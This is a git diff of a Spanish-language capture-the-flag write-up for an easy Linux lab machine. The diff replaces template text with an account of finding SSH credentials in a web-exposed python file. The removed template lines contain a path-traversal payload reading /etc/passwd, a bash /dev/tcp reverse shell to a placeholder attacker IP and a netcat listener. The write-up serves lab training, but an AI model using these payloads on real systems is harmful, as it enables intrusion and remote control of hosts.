@@ -2,7 +2,7 @@
 
 | Propiedad | Detalle |
 | :--- | :--- |
-| **Plataforma** | DockerLabs |
+| **Plataforma** | Whoami Labs |
 | **Dificultad** | 🟢 Fácil  |
 | **OS** | Linux  |
 | **IP de la Máquina** | `172.0.0.2` |
@@ -11,8 +11,8 @@
 ---
 
 ## 📝 Descripción
-Breve introducción sobre la máquina o el contexto del reto. 
-*Ejemplo: Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.*
+SUID & Sudo
+Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.
 
 ---
 
@@ -44,7 +44,8 @@ sudo nmap -p22,80,8080 -sCV 172.17.0.2 -oN targeted
 ### Enumeración Web (Puerto 80)
 Al inspeccionar el sitio web, nos encontramos con la siguiente interfaz:
 
-![Interfaz Web](img/web_home.png) 
+<img src="./img/web_home.png" width="70%">
+
 
 Aplicamos fuzzing de directorios para buscar rutas ocultas:
 ```bash
@@ -53,38 +54,14 @@ gobuster dir -u http://10.10.X.X/ -w /usr/share/wordlists/dirb/common.txt -x php
 
 ---
 
-## 💥 2. Fase de Explotación (Acceso Inicial)
+## 💥 2. Fase de Explotación 
 
 ### Vector de Ataque
-Describir cómo se aprovecha la vulnerabilidad encontrada (ej. *Local File Inclusion*, *RCE*, *Credenciales por defecto*, etc.).
+En la enumeración web, descubrimos un directorio dev con dos carpetas y un txt. Después de ir revisando todos los documentos que contenía, descubrimos que dentro de un fichero en python dentro del directorio .conf hay unas credenciales de un usuario de ssh.
+Probamos las credenciales encontradas para conectarnos por ssh al puerto 22 y funcionan.
+Ahora somos el usuario srv_backup.
 
-```http
-# Ejemplo de Payload o petición vulnerable utilizada
-http://10.10.X.X/index.php?file=../../../../etc/passwd
-```
-
-### Intrusión (Reverse Shell)
-Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:
-
-```bash
-# Comando ejecutado en la máquina víctima
-bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'
-```
-
-Ponemos nuestro *netcat* a la escucha para recibir la conexión:
-```bash
-nc -nlvp 4444
-```
-
-Una vez dentro, realizamos el tratamiento de la TTY para tener una consola interactiva cómoda:
-```bash
-script /dev/null -c bash
-# Ctrl+Z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-```
-
+<img src=".img/ssh.png" width="70%">
 ---
 
 ## 👑 3. Escalada de Privilegios
